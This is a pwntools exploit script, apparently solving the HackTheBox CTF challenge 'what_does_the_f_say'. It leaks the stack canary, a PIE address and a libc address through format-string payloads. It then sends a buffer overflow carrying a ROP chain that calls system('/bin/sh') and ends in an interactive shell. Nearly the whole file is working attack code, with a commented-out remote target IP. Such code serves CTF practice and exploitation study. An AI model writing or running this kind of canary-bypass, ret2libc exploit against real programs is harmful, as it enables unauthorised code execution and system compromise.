from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./what_does_the_f_say")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/CTF/htb/what_does_the_f_say/libc.so.6"}


#p = remote("178.128.174.134", 31491)
p = process("./what_does_the_f_say")
#p = gdb.debug("./what_does_the_f_say", '''break *main
#break *warning+252''')


# Memory Leak: Canary Address
payload = ""
payload += "%13$llx"

# Memory Leak: __libc_csu_init address for PIE Bypess
payload2 = ""
payload2 += "%6$llx"       # __libc_read+18 leak

# Memory Leak: __libc_read+18
payload3 = ""
payload3 += "%3$llx"


# Stack Canary Leak
p.sendline("1")
p.clean()
p.sendline("2")
p.clean()

time.sleep(1)
p.clean()
p.sendline(payload)
canary_leak = int(p.recvline(), 16)
p.clean()

print "Canary leak:", hex(canary_leak)

time.sleep(1)
# PIE Bypass - __libc_csu_init leak setup
p.sendline("1")
p.clean()
p.sendline("2")
p.clean()

# __libc_csu_init leak
p.sendline(payload2)
libc_csu_init_leak = int(p.recvline(), 16)
pie_base = libc_csu_init_leak - 6240
p.clean()

time.sleep(1)

# libc_read Leak Setup
p.sendline("1")
p.clean()
p.sendline("2")
p.clean()

# libc leak Canary Leak
p.clean()
p.sendline(payload3)
libc_leak = int(p.recvline(), 16)
libc_read = libc_leak - 18
libc_main = libc_read - 958512
libc_system = libc_main + 189184
p.recvline()
p.clean()

# Spend $ to trigger warning()
for i in range(7):
    p.sendline("2")
    p.clean()
    p.sendline("1")
    p.clean()
    time.sleep(1) # Debugging purposes, race condition errors


# Stack Canary & Overflow Setup
p.sendline("1")
p.clean()
p.sendline("2")
p.clean()
p.sendline("Red")
p.clean()

# 32 bytes overflows RIP
# 8 bytes of "C" padding overflow RBP
# Leave instruction: RBP -> RSP
# Ret -> RSP
# Tested by placing Canary into RAX manually during overflow check.
# \x00 at end of Stack Canary stops overflow @ 32 bytes not allowing
# "C" padding overflows

# 0x00000000000018bb : pop rdi ; ret
pop_rdi = pie_base + 0x18bb
pop_rsi = pie_base + 0x18b9 #pop rsi ; pop r15; ret;
ret = pie_base + 0x1016
binsh = libc_main + 1639981


print "Canary leak:", hex(canary_leak)
print "libc_csu_init() leak:", hex(libc_csu_init_leak)
print "PIE Base Address:", hex(pie_base)
print "ROP Gadget Address:", hex(pop_rdi)
print "libc leak: ", hex(libc_leak)
print "libc_read() leak:", hex(libc_read)
print "libc_main() leak:", hex(libc_main)
print "libc_system() leak:", hex(libc_system)
print "/bin/sh leak:", hex(binsh)


# Stack Canary Bypass
payload4 = ""
payload4 += "A" * 24
payload4 += p64(canary_leak)
payload4 += "C" * 8

payload4 += p64(pop_rdi)
payload4 += p64(binsh)
payload4 += p64(ret)
payload4 += p64(libc_system)

p.sendline(payload4)
p.interactive()
